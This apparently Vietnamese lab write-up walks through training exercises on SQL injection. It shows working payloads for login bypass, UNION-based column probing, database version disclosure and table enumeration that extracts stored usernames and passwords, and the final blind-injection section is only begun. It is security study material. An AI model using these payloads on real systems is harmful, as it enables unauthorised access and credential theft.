### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

![Alt text](image.png)

Đây là giao diện chính, mình click vô xem detail 1 sản phẩm thì thấy có xuất hiện productID ở URL 

![Alt text](image-1.png)

Ta thấy filter category=Gift -> khả năng câu lệnh SQL được thực hiện như sau

```
SELECT * from <table_name> where category = 'input' AND released = 1
```

Ta sẽ sửa phần path như sau để xem được các sản phẩm chưa được release

filter?category=Gifts' or 1 = 1--

thì câu SQL trên là: 

```sql
SELECT * from <table_name> where category = 'Gift' or 1 = 1--' AND released = 1
```

-> Câu SQL trên luôn trả về là True, ta sẽ thấy all sản phẩm (kể cả các sản phẩm chưa được release).

![Alt text](image-2.png)

### Lab: SQL injection vulnerability allowing login bypass

![](image-3.png)

Ta nhập username: admin' or 1 = 1--, password giá trị nào cũng được

Khả năng câu SQL được thực thi như sau:

```sql
SELECT * FROM users WHERE username = 'admin' or 1 = 1-- and password = 'pwd'
```

Câu SQL trên đúng và ta vào được admin

![Alt text](image-4.png)

![Alt text](image-5.png)

### Lab: SQL injection attack, querying the database type and version on Oracle

Tương tự ta cũng thấy filter category, xác định số cột của category:

![Alt text](image-6.png)

thử order by 3-- -> Lỗi 500 Internal Server Error -> 2 cột

![Alt text](image-7.png)

Khả năng cao 2 cột này có kiểu là text.

Thử union select "duong", "hao" from dual-- xem dự đoán có chuẩn không? (dual là 1 table được Oracle cung cấp, được dùng để test) -> nếu union thành công -> dự đoán chuẩn

![Alt text](image-8.png)

Lướt xuống dưới thì có duong hao

![](image-9.png)

Cách kiểm tra version của các hệ quản trị CSDL

![Alt text](image-10.png)

```
filter?category=Accessories' union select banner, null from v$version--
```

Kết quả:

![Alt text](image-11.png)

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Tương tự, ta cũng xác định được 2 cột có kiểu là text

![Alt text](image-12.png)

![Alt text](image-13.png)

Với MySQL và Microsoft dùng select @@ version -> mình sẽ filter như sau

```
filter?category=Gifts' union select @@version, null#
```

Kết quả:

![Alt text](image-14.png)

### Lab: SQL injection attack, listing the database contents on non-Oracle databases

Tương tự, ta xác định được category có 2 column kiểu text.

Ta xác định danh sách các table có trong database:

```
filter?category=Pets' union select table_name, null from information_schema.tables--
```

Ta thu được 1 list các table như sau:

![Alt text](image-15.png)

trong đó ta đoán table user_newtua chứa username, password của admin

Tiếp tục xem các column của table user_newtua

![Alt text](image-16.png)

Ta nhận thấy có 2 column khả nghi là username_nwffts và password_rzyisn.

Tiếp tục:

```
category=Pet' union select username_nwffts, password_rzyisn from user_newtua--
```

![Alt text](image-17.png)

và sau đó đăng nhập thành công

![Alt text](image-18.png)

### Lab: SQL injection attack, listing the database contents on Oracle

Tương tự, ta thu được danh sách các table:

```
category=Gift' union select table_name, null from all_tables--
```

![Alt text](image-19.png)

Ta thấy có table này

![](image-20.png)

Tiếp tục xem danh sách column của table

![Alt text](image-21.png)

![](image-22.png)

```
filter?category=Gifts' union select USERNAME_GZVGTI, PASSWORD_ARMTHE from USERS_MXGZUE--
```

Thu được:

![Alt text](image-23.png)

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

Dùng union select null-- đến khi được :v

![Alt text](image-24.png)

### Lab: SQL injection UNION attack, finding a column containing text

![](image-25.png)

![Alt text](image-26.png)

Nhận ra category có 3 column có kiểu lần lượt là số, chuỗi, số

![Alt text](image-27.png)

Giờ thì thay tên column là được.

![Alt text](image-30.png)

### Lab: SQL injection UNION attack, retrieving data from other tables

Kiểm tra thì thấy có 2 column (đã thử 3-- và lỗi)

![Alt text](image-31.png)

Vậy 2 column đó đều có kiểu là chuỗi

![Alt text](image-32.png)

Thay bằng username, password và table users

![Alt text](image-34.png)

### SQL injection UNION attack, retrieving multiple values in a single column

Tương tự ta phát hiện 2 column kiểu chuỗi và số

![Alt text](image-35.png)

### Blind SQL injection with conditional responses

Vì là blind SQL Injection, ta thử từng kết quả, nếu web vẫn welcome -> true

![Alt text](image-16.png)